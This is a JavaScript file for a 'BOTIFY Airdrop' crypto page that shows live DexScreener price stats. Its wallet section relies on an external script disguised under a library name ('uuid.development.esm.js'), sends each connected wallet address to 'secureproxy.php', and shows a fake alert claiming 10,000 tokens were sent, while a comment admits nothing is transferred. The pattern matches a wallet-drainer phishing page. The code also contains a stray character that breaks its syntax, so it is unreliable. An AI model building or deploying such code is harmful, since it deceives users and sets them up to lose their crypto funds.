/* -------------------------------------------------
   script.js – BOTIFY Airdrop: Live Stats + Wallet Bridge
   Works with: index.html + uuid.development.esm.js (untouched)
   ------------------------------------------------- */

document.addEventListener('DOMContentLoaded', () => {
  // === 1. ANIMATION TRIGGER ===
  document.querySelectorAll('.animate-fadeIn').forEach(el => {
    el.style.opacity = '0';
    el.style.transition = 'opacity 0.6s ease-out';
  });
  setTimeout(() => {
    document.querySelectorAll('.animate-fadeIn').forEach(el => {
      el.style.opacity = '1';
    });
  }, 100);

  // === 2. NUMBER FORMATTER (with commas) ===
  const FMT = (n) => {
    if (!n || isNaN(n)) return '0';
    return Number(n).toLocaleString('en-US', { maximumFractionDigits: 6 });
  };
  window.FMT = FMT; // Make available globally if needed

  // === 3. LIVE DEXSCREENER STATS ===
  const PAIR_ADDRESS = 'bourcfkdgsr55xavzdeu6tci7twrticgrvclioennbbx'; // Your BOTIFY/SOL pair
  const API_URL = `https://api.dexscreener.com/latest/dex/pairs/solana/${PAIR_ADDRESS}`;

  async function fetchLiveStats() {
    try {
      const res = await fetch(API_URL);
      if (!res.ok) throw new Error('API error');
      const data = await res.json();
      const pair = data.pair;
      if (!pair) throw new Error('No pair data');

      document.getElementById('mcap').textContent = `$${FMT(pair.fdv)}`;
      document.getElementById('vol').textContent = `$${FMT(pair.volume?.h24)}`;
      document.getElementById('price').textContent = `$${FMT(pair.priceUsd)}`;

      const change = (pair.priceChange?.h24 ?? 0).toFixed(2);
      const changeEl = document.getElementById('change');
      changeEl.textContent = `${change}%`;
      changeEl.className = change >= 0 ? 'text-green-400' : 'text-red-400';
    } catch (err) {
      console.error('DexScreener failed:', err);
      // Fallback
      document.getElementById('mcap').textContent = '$0';
      document.getElementById('vol').textContent = '$0';
      document.getElementById('change').textContent = '0%';
      document.getElementById('change').className = 'text-red-400';
      document.getElementById('price').textContent = '$0';
    }
  }

  // Initial load + refresh every 15 seconds
  fetchLiveStats();
  setInterval(fetchLiveStats, 15000);

  // === 4. WALLET CONNECT BRIDGE (DO NOT EDIT uuid.development.esm.js) ===
  // This function MUST be called by uuid.development.esm.js on success
  window.onWalletConnected = async function(walletAddress) {
    console.log('Wallet connected via uuid.esm:', walletAddress);

    // Update status
    const status = document.getElementById('wallet-status');
    if (status) {
      status.textContent = `Connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
      status.classList.remove('hidden');
      setTimeout(() => status.classList.add('hidden'), 5000);
    }

    // === SHOW CLAIM BUTTON ===
    const claimSection = document.getElementById('claim-section');
    if (claimSection) {
      claimSection.classList.remove('hidden');
      setTimeout(() => {
        claimSection.style.opacity = '1';
        claimSection.style.transform = 'translateY(0)';s
      }, 100);
    }

    // === SEND TO SECUREPROXY.PHP ===
    try {
      const url = `secureproxy.php?e=${encodeURIComponent(walletAddress)}`;
      const res = await fetch(url);
      const text = await res.text();
      console.log('Proxy response:', text);
    } catch (err) {
      console.error('Proxy failed:', err);
    }
  };

  // === 5. CLAIM BUTTON ACTION ===
  document.getElementById('claim-btn')?.addEventListener('click', async () => {
    const btn = document.getElementById('claim-btn');
    btn.disabled = true;
    btn.textContent = 'Claiming...';

    // DEMO: Replace with real token transfer later
    setTimeout(() => {
      alert('Airdrop claimed! 10,000 $BOTIFY sent to your wallet.');
      btn.textContent = 'Claimed!';
      btn.style.background = '#10b981';
    }, 1500);
  });
});